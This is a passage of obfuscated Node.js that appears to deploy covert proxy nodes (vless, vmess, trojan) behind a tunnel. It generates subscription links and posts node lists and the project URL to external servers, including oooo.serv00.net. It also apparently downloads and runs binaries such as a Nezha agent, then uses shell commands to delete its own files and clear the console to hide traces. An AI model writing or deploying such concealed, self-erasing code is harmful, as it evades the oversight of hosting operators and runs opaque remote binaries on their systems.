_0x42976c[_0x4831fd(_0x1eeb7c._0x21e245)]['countryCode']+'_'+_0x42976c[_0x4831fd(_0x1eeb7c._0x53841c)]['org'];}catch(_0x3fc58f){}}return'Unknown';}async function _0x227d89(_0x21c2a2){const _0x245420=await _0x3af52d(),_0x40fe0a=NAME?NAME+'-'+_0x245420:_0x245420;return new Promise(_0x27ff96=>{const _0x3d63aa={_0x239bea:0xd0,_0x57d960:0x102,_0x37c762:0x15f,_0x859313:0xb0,_0x5552df:0x159,_0x3c13b1:0xd5,_0x4d265f:0x123,_0x4f8038:0xfc,_0x2b6274:0xf0};setTimeout(()=>{const _0x45ef3d={_0x5e05d8:0xfc,_0x2e9ae5:0xff,_0x1c3efa:0xe9},_0x13c20e=_0x21e2,_0x3bfee6={'v':'2','ps':''+_0x40fe0a,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x13c20e(0xd0),'net':'ws','type':_0x13c20e(_0x3d63aa._0x239bea),'host':_0x21c2a2,'path':_0x13c20e(_0x3d63aa._0x57d960),'tls':_0x13c20e(0xca),'sni':_0x21c2a2,'alpn':'','fp':_0x13c20e(_0x3d63aa._0x37c762)},_0xa7b4fa=_0x13c20e(0xdd)+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x21c2a2+_0x13c20e(0xbe)+_0x21c2a2+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x40fe0a+_0x13c20e(_0x3d63aa._0x859313)+Buffer[_0x13c20e(0xfc)](JSON[_0x13c20e(0x9e)](_0x3bfee6))[_0x13c20e(_0x3d63aa._0x5552df)]('base64')+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x13c20e(_0x3d63aa._0x3c13b1)+_0x21c2a2+_0x13c20e(0xbe)+_0x21c2a2+_0x13c20e(_0x3d63aa._0x4d265f)+_0x40fe0a+_0x13c20e(0xfd);console['log'](Buffer[_0x13c20e(0xfc)](_0xa7b4fa)[_0x13c20e(0x159)](_0x13c20e(0xff))),fs[_0x13c20e(0xf3)](subPath,Buffer[_0x13c20e(_0x3d63aa._0x4f8038)](_0xa7b4fa)[_0x13c20e(0x159)](_0x13c20e(0xff))),console['log'](FILE_PATH+_0x13c20e(_0x3d63aa._0x2b6274)),uploadNodes(),app[_0x13c20e(0xe2)]('/'+SUB_PATH,(_0x517920,_0x4db4e9)=>{const _0x4d05d2=_0x13c20e,_0x1f96fa=Buffer[_0x4d05d2(_0x45ef3d._0x5e05d8)](_0xa7b4fa)[_0x4d05d2(0x159)](_0x4d05d2(_0x45ef3d._0x2e9ae5));_0x4db4e9[_0x4d05d2(0x14f)](_0x4d05d2(0xf5),_0x4d05d2(_0x45ef3d._0x1c3efa)),_0x4db4e9[_0x4d05d2(0x11f)](_0x1f96fa);}),_0x27ff96(_0xa7b4fa);},0x7d0);});}}async function uploadNodes(){const _0xf7615e={_0x56fe10:0x15b,_0x17c376:0xfa,_0x2b5444:0x13b,_0x55cfe4:0x146,_0xa470e7:0x15b},_0x543977=_0x473d5e;if(UPLOAD_URL&&PROJECT_URL){const _0x352a66=PROJECT_URL+'/'+SUB_PATH,_0x1a58a7={'subscription':[_0x352a66]};try{const _0x545605=await axios[_0x543977(0xfb)](UPLOAD_URL+_0x543977(0x150),_0x1a58a7,{'headers':{'Content-Type':_0x543977(0x137)}});return _0x545605&&_0x545605[_0x543977(_0xf7615e._0x56fe10)]===0xc8?(console[_0x543977(0x162)](_0x543977(0x151)),_0x545605):null;}catch(_0x4930a9){if(_0x4930a9[_0x543977(0x103)]){if(_0x4930a9['response'][_0x543977(0x15b)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x543977(0x12c)](listPath))return;const _0x5da738=fs[_0x543977(0x13d)](listPath,_0x543977(0xa4)),_0x512fc2=_0x5da738[_0x543977(_0xf7615e._0x17c376)]('\x0a')[_0x543977(_0xf7615e._0x2b5444)](_0xf10b3b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x543977(0xe5)](_0xf10b3b));if(_0x512fc2[_0x543977(_0xf7615e._0x55cfe4)]===0x0)return;const _0x5e91ec=JSON['stringify']({'nodes':_0x512fc2});try{const _0x4fa64c=await axios[_0x543977(0xfb)](UPLOAD_URL+_0x543977(0xc9),_0x5e91ec,{'headers':{'Content-Type':'application/json'}});return _0x4fa64c&&_0x4fa64c[_0x543977(_0xf7615e._0xa470e7)]===0xc8?(console['log']('Nodes\x20uploaded\x20successfully'),_0x4fa64c):null;}catch(_0x512731){return null;}}else return;}}function cleanFiles(){const _0x14c05b={_0x2a5011:0x139,_0x37b8f9:0x147},_0x191011={_0x130643:0xbb,_0x4f28ca:0x162,_0x16d797:0x162,_0x436a7d:0xa3};setTimeout(()=>{const _0x2915e1={_0x9d13a0:0x162},_0x277288=_0x21e2,_0x43ef23=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x43ef23[_0x277288(0xce)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x43ef23['push'](phpPath);process[_0x277288(0x15c)]===_0x277288(0x120)?exec(_0x277288(_0x14c05b._0x2a5011)+_0x43ef23[_0x277288(0x147)]('\x20')+_0x277288(0xb8),_0x3464f0=>{const _0x377f73=_0x277288;console[_0x377f73(_0x191011._0x130643)](),console[_0x377f73(_0x191011._0x4f28ca)](_0x377f73(0xe3)),console[_0x377f73(_0x191011._0x16d797)](_0x377f73(_0x191011._0x436a7d));}):exec(_0x277288(0x13e)+_0x43ef23[_0x277288(_0x14c05b._0x37b8f9)]('\x20')+'\x20>/dev/null\x202>&1',_0x568407=>{const _0x41e7a6=_0x277288;console['clear'](),console[_0x41e7a6(_0x2915e1._0x9d13a0)](_0x41e7a6(0xe3)),console[_0x41e7a6(0x162)](_0x41e7a6(0xa3));});},0x15f90);}cleanFiles();function _0x21e2(_0x5379d8,_0xc647bc){const _0x221a54=_0x221a();return _0x21e2=function(_0x21e291,_0x2a173b){_0x21e291=_0x21e291-0x9e;let _0x23daea=_0x221a54[_0x21e291];return _0x23daea;},_0x21e2(_0x5379d8,_0xc647bc);}async function AddVisitTask(){const _0x4b30d3={_0x2100a4:0xc5,_0x2689d6:0x137,_0x13e417:0xea},_0x5085b3=_0x473d5e;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x5085b3(_0x4b30d3._0x2100a4));return;}try{const _0x5e91a6=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x5085b3(_0x4b30d3._0x2689d6)}});return console['log'](_0x5085b3(_0x4b30d3._0x13e417)),_0x5e91a6;}catch(_0x523da0){return console['error'](_0x5085b3(0xe8)+_0x523da0['message']),null;}}async function startserver(){const _0x32c6fe=_0x473d5e;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5eb290){console[_0x32c6fe(0x15e)](_0x32c6fe(0xa7),_0x5eb290);}}startserver()[_0x473d5e(0x10e)](_0x2445f2=>{const _0x558e63={_0x1ce87e:0x15e,_0x3ef857:0x143},_0xe608dd=_0x473d5e;console[_0xe608dd(_0x558e63._0x1ce87e)](_0xe608dd(_0x558e63._0x3ef857),_0x2445f2);}),app[_0x473d5e(0x11d)](PORT,()=>console['log']('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
